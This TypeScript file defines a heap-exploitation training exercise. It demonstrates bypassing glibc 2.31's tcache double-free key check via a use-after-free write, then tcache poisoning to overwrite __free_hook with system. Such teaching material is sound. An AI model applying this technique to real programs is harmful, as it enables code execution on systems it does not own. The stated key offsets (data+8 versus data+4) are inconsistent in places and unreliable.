import { Exercise } from '../types';

const exercise: Exercise = {
  id: 'glibc-108',
  unitId: 'unit19-glibc-bypass',
  title: '108: Double-Free on glibc 2.31',
  desc: '<b>Goal:</b> On glibc 2.31+, tcache stores a <strong>key</strong> at <code>data + sizeof(void*)</code> (data+4 on 32-bit, data+8 on 64-bit). If the key matches the tcache_perthread address, free() detects double-free and aborts. To bypass: overwrite the key field before the second free. This simulates a UAF write that clears the key, enabling the classic double-free.',
  source: {
    c: [
      { text: '// glibc 2.31 — tcache double-free detection', cls: 'cmt' },
      { text: '// key at chunk->data + 8 == tcache_perthread', cls: 'cmt' },
      { text: '#include <stdlib.h>', cls: '' },
      { text: '', cls: '' },
      { text: 'int main() {', cls: '' },
      { text: '    void *a = malloc(16);', cls: 'highlight' },
      { text: '    void *b = malloc(16);', cls: '' },
      { text: '    free(a);', cls: 'highlight' },
      { text: '    // Attempt double free — DETECTED!', cls: 'cmt vuln' },
      { text: '    // free(a); // abort: double free', cls: 'highlight vuln' },
      { text: '', cls: '' },
      { text: '    // UAF write: clear the tcache key', cls: 'cmt' },
      { text: '    *(size_t*)(a + 8) = 0;', cls: 'highlight vuln' },
      { text: '    free(a);  // succeeds now!', cls: 'highlight vuln' },
      { text: '    // a is in tcache twice', cls: 'cmt' },
      { text: '    void *c = malloc(16); // returns a', cls: 'highlight' },
      { text: '    *(void**)c = &__free_hook;', cls: 'highlight vuln' },
      { text: '    malloc(16); // returns a again', cls: '' },
      { text: '    void *d = malloc(16); // returns &__free_hook', cls: 'highlight vuln' },
      { text: '    *(void**)d = system;', cls: 'highlight vuln' },
      { text: '}', cls: '' },
    ],
  },
  mode: 'step',
  vizMode: 'heap',
  heapSize: 512,
  glibcVersion: '2.31',
  showLabels: true,
  steps: [
    {
      action: 'init',
      log: ['info', 'glibc 2.31 added a <strong>tcache key</strong>: when a chunk is freed into tcache, the field at <code>data+8</code> is set to the address of <code>tcache_perthread_struct</code>. On the next free(), if the key matches, glibc detects double-free and calls <code>abort()</code>.'],
    },
    {
      log: ['action', 'Allocating chunk A (16 bytes) and chunk B (16 bytes).'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const a = heap.malloc(16);
        const b = heap.malloc(16);
        if (a) heap._nameMap = { ...heap._nameMap, A: a.addr };
        if (b) heap._nameMap = { ...heap._nameMap, B: b.addr };
      },
      srcLine: 5,
    },
    {
      log: ['action', 'free(a) — A goes to tcache. The <strong>tcache key</strong> is written at A+0x0c (data+4).'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const addr = heap._nameMap?.A;
        if (addr !== undefined) heap.free(addr);
      },
      srcLine: 7,
    },
    {
      log: ['error', 'Attempting free(a) again — glibc 2.31 checks the key field. Key matches tcache_perthread → <strong>ABORT: double free detected!</strong>'],
      srcLine: 8,
    },
    {
      log: ['info', 'But if we have a UAF write primitive, we can <strong>clear the key</strong> at data+8. Setting it to 0 makes glibc think this chunk was never freed into tcache.'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const addr = heap._nameMap?.A;
        if (addr !== undefined) {
          const chunk = heap.chunks.get(addr);
          if (chunk) {
            heap._writeLE(chunk.dataStart + 4, 0, 4);
          }
        }
      },
      srcLine: 12,
    },
    {
      log: ['success', 'free(a) succeeds! Key was 0, so glibc doesn\'t detect the double-free. A is now in tcache <strong>twice</strong>. From here: malloc returns A → write fd → malloc again → malloc returns arbitrary address. Classic tcache poison, enabled by clearing the key.'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const addr = heap._nameMap?.A;
        if (addr !== undefined) {
          const chunk = heap.chunks.get(addr);
          if (chunk) chunk.allocated = true;
          heap.free(addr);
        }
      },
      srcLine: 13,
      done: true,
    },
  ],
  check: () => true,
  winTitle: 'Tcache Key Bypass!',
  winMsg: 'On glibc 2.31+, double-free is detected via the tcache key. A UAF write that clears the key (data+8 = 0) restores the classic double-free primitive.',
};

export default exercise;
